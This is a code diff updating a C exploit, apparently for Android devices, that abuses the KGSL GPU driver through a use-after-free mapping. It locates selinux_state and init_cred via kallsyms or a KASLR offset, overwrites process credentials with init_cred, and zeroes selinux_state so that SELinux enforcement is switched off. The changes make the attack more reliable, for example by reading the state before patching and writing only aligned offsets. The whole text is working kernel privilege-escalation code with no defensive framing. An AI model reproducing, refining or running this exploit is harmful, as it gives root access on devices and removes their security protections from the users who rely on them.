@@ -145,38 +145,27 @@ uint64_t get_kaslr_offset(void) {
     return (uint64_t)kaslr;
 }
 
-uint64_t get_selinux_state_from_file(void) {
+uint64_t get_symbol_from_file(const char *sym) {
     const char *path = "/data/local/tmp/kallsyms.txt";
     FILE *fp = fopen(path, "r");
     if (!fp) {
-        printf("[-] Cannot open %s, using fallback\n", path);
-        uint64_t kaslr = get_kaslr_offset();
-        if (!kaslr) return 0;
-        int64_t ks = (int64_t)kaslr;
-        return (uint64_t)((int64_t)VMLINUX_SELINUX_STATE + ks);
+        printf("[-] Cannot open %s\n", path);
+        return 0;
     }
     char line[512];
     uint64_t addr = 0;
     while (fgets(line, sizeof(line), fp)) {
-        char sym[128];
+        char sym_name[128];
         char type;
         unsigned long long a;
-        if (sscanf(line, "%llx %c %127s", &a, &type, sym) == 3) {
-            if (strcmp(sym, "selinux_state") == 0) {
+        if (sscanf(line, "%llx %c %127s", &a, &type, sym_name) == 3) {
+            if (strcmp(sym_name, sym) == 0) {
                 addr = (uint64_t)a;
                 break;
             }
         }
     }
     fclose(fp);
-    if (!addr) {
-        printf("[-] selinux_state not found in kallsyms.txt, using fallback\n");
-        uint64_t kaslr = get_kaslr_offset();
-        if (!kaslr) return 0;
-        int64_t ks = (int64_t)kaslr;
-        return (uint64_t)((int64_t)VMLINUX_SELINUX_STATE + ks);
-    }
-    printf("[+] selinux_state address from file: 0x%lx\n", (unsigned long)addr);
     return addr;
 }
 
@@ -200,7 +189,7 @@ void flush_cpu_cache(void *start, size_t len) {
 }
 
 void gen_avc_entries_enhanced(void) {
-    for (int i = 0; i < 3000; i++) {
+    for (int i = 0; i < 5000; i++) {
         char path[64];
         snprintf(path, sizeof(path), "/proc/%d/status", (i % 3000) + 1);
         int fd = open(path, O_RDONLY);
@@ -246,15 +235,29 @@ int main(int argc, char **argv) {
     (void)argc;
     (void)argv;
     setbuf(stdout, NULL);
-    printf("[+] Combined AVC+Cred exploit v11 (kallsyms.txt based)\n");
+    printf("[+] Combined AVC+Cred exploit v12 (kallsyms.txt based, safe patching)\n");
 
-    uint64_t selinux_state_addr = get_selinux_state_from_file();
+    uint64_t selinux_state_addr = get_symbol_from_file("selinux_state");
     if (!selinux_state_addr) {
-        printf("[-] Failed to get selinux_state address\n");
-        return 1;
+        printf("[-] selinux_state not found, using fallback\n");
+        uint64_t kaslr = get_kaslr_offset();
+        if (!kaslr) return 1;
+        selinux_state_addr = (uint64_t)((int64_t)VMLINUX_SELINUX_STATE + (int64_t)kaslr);
     }
-
     printf("[*] selinux_state: 0x%lx\n", (unsigned long)selinux_state_addr);
+
+    uint64_t init_cred_addr = get_symbol_from_file("init_cred");
+    if (!init_cred_addr) {
+        printf("[-] init_cred not found, using fallback\n");
+        uint64_t kaslr = get_kaslr_offset();
+        if (!kaslr) {
+            printf("[-] Cannot get init_cred, skipping cred overwrite\n");
+            init_cred_addr = 0;
+        } else {
+            init_cred_addr = (uint64_t)((int64_t)VMLINUX_INIT_CRED + (int64_t)kaslr);
+        }
+    }
+    if (init_cred_addr) printf("[*] init_cred: 0x%lx\n", (unsigned long)init_cred_addr);
 
     int start_pipe[2], done_pipe[2], setenforce_pipe[2];
     pipe(start_pipe); pipe(done_pipe); pipe(setenforce_pipe);
@@ -467,57 +470,82 @@ int main(int argc, char **argv) {
     flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
 
     printf("[*] Phase 8: Overwrite cred pages with init_cred (if any)\n");
-    if (n_cred > 0) {
-        uint64_t kaslr = get_kaslr_offset();
-        if (!kaslr) {
-            printf("[-] Failed to get KASLR for init_cred, skipping cred overwrite\n");
-        } else {
-            int64_t ks = (int64_t)kaslr;
-            uint64_t init_cred_addr = (uint64_t)((int64_t)VMLINUX_INIT_CRED + ks);
-            printf("[*] init_cred address: 0x%lx\n", (unsigned long)init_cred_addr);
-            for (int p = 0; p < n_cred && p < 32; p++) {
-                uint64_t cbase = cred_pages[p] + cred_offs[p];
-                uint32_t *cmd = (uint32_t *)ib_m;
-                int dw = 0;
-                memset(ib_m, 0, 0x10000);
-                memset(dst_m, 0, 0x1000);
+    if (n_cred > 0 && init_cred_addr) {
+        for (int p = 0; p < n_cred && p < 32; p++) {
+            uint64_t cbase = cred_pages[p] + cred_offs[p];
+            uint32_t *cmd = (uint32_t *)ib_m;
+            int dw = 0;
+            memset(ib_m, 0, 0x10000);
+            memset(dst_m, 0, 0x1000);
 
-                cmd[dw++] = cp_type7(CP_NOP, 0);
-                for (int i = 0; i < CRED_COPY_SIZE/4; i++) {
-                    uint32_t dl, dh, sl, sh;
-                    split64(dst_ga + i*4, &dl, &dh);
-                    split64(init_cred_addr + i*4, &sl, &sh);
-                    cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-                    cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-                    cmd[dw++] = sl; cmd[dw++] = sh;
-                }
-                for (int i = 0; i < CRED_COPY_SIZE/4; i++) {
-                    uint32_t dl, dh, sl, sh;
-                    split64(cbase + i*4, &dl, &dh);
-                    split64(dst_ga + i*4, &sl, &sh);
-                    cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-                    cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-                    cmd[dw++] = sl; cmd[dw++] = sh;
-                }
-                cmd[dw++] = cp_type7(CP_NOP, 0);
-                __sync_synchronize();
-                unsigned int ts;
-                if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
-                    wait_timestamp(kgsl_fd, ctx, ts);
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            for (int i = 0; i < CRED_COPY_SIZE/4; i++) {
+                uint32_t dl, dh, sl, sh;
+                split64(dst_ga + i*4, &dl, &dh);
+                split64(init_cred_addr + i*4, &sl, &sh);
+                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+                cmd[dw++] = sl; cmd[dw++] = sh;
             }
-            flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
-            printf("  Cred overwrite done\n");
+            for (int i = 0; i < CRED_COPY_SIZE/4; i++) {
+                uint32_t dl, dh, sl, sh;
+                split64(cbase + i*4, &dl, &dh);
+                split64(dst_ga + i*4, &sl, &sh);
+                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+                cmd[dw++] = sl; cmd[dw++] = sh;
+            }
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int ts;
+            if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
+                wait_timestamp(kgsl_fd, ctx, ts);
+        }
+        flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
+        printf("  Cred overwrite done\n");
+    }
+
+    // Read current selinux_state before patching
+    printf("[*] Phase 9a: Reading selinux_state before patching\n");
+    {
+        uint32_t *cmd = (uint32_t *)ib_m;
+        int dw = 0;
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, 0x1000);
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int i = 0; i < 8; i++) {
+            uint32_t dl, dh, sl, sh;
+            split64(dst_ga + i*4, &dl, &dh);
+            split64(selinux_state_addr + i*4, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
+            wait_timestamp(kgsl_fd, ctx, ts);
+        __sync_synchronize();
+        uint32_t *d = (uint32_t *)dst_m;
+        printf("  selinux_state before: %08x %08x %08x %08x %08x %08x %08x %08x\n",
+               d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7]);
+        // Check if already permissive
+        if (d[1] == 0 && d[2] == 0 && d[3] == 0) {
+            printf("[+] selinux_state already zero, skipping patch\n");
+            goto skip_patch;
         }
     }
 
-    printf("[*] Phase 9: Aggressive SELinux state zeroing (0x0..0x100)\n");
+    printf("[*] Phase 9b: Patching selinux_state (aligned offsets 0x0,0x4,0x8,0xc,0x10,0x14,0x18,0x1c,0x20)\n");
     {
         uint32_t *cmd = (uint32_t *)ib_m;
         int dw = 0;
         memset(ib_m, 0, 0x10000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
-        for (int off = 0; off < 0x100; off++) {
-            uint64_t addr = selinux_state_addr + off;
+        int offsets[] = {0x0, 0x4, 0x8, 0xc, 0x10, 0x14, 0x18, 0x1c, 0x20};
+        for (int i = 0; i < sizeof(offsets)/sizeof(int); i++) {
+            uint64_t addr = selinux_state_addr + offsets[i];
             uint32_t al, ah;
             split64(addr, &al, &ah);
             cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
@@ -536,14 +564,16 @@ int main(int argc, char **argv) {
         }
     }
 
-    printf("[*] Phase 10: Verify selinux_state after zeroing\n");
+skip_patch:
+
+    printf("[*] Phase 10: Verify selinux_state after patching\n");
     {
         uint32_t *cmd = (uint32_t *)ib_m;
         int dw = 0;
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, 0x1000);
         cmd[dw++] = cp_type7(CP_NOP, 0);
-        for (int i = 0; i < 16; i++) {
+        for (int i = 0; i < 8; i++) {
             uint32_t dl, dh, sl, sh;
             split64(dst_ga + i*4, &dl, &dh);
             split64(selinux_state_addr + i*4, &sl, &sh);
@@ -558,14 +588,13 @@ int main(int argc, char **argv) {
             wait_timestamp(kgsl_fd, ctx, ts);
         __sync_synchronize();
         uint32_t *d = (uint32_t *)dst_m;
-        printf("  selinux_state[0..15]:");
-        for (int i = 0; i < 16; i++) {
-            if (i % 8 == 0) printf("\n    ");
-            printf("%08x ", d[i]);
+        printf("  selinux_state after:  %08x %08x %08x %08x %08x %08x %08x %08x\n",
+               d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7]);
+        if (d[1] == 0 && d[2] == 0 && d[3] == 0) {
+            printf("[+] selinux_state successfully zeroed\n");
+        } else {
+            printf("[-] selinux_state not zeroed\n");
         }
-        printf("\n");
-        if (d[0] == 0 && d[1] == 0 && d[2] == 0 && d[3] == 0)
-            printf("[+] selinux_state appears zeroed\n");
     }
 
     printf("[*] Phase 11: Signal children to try setenforce 0\n");
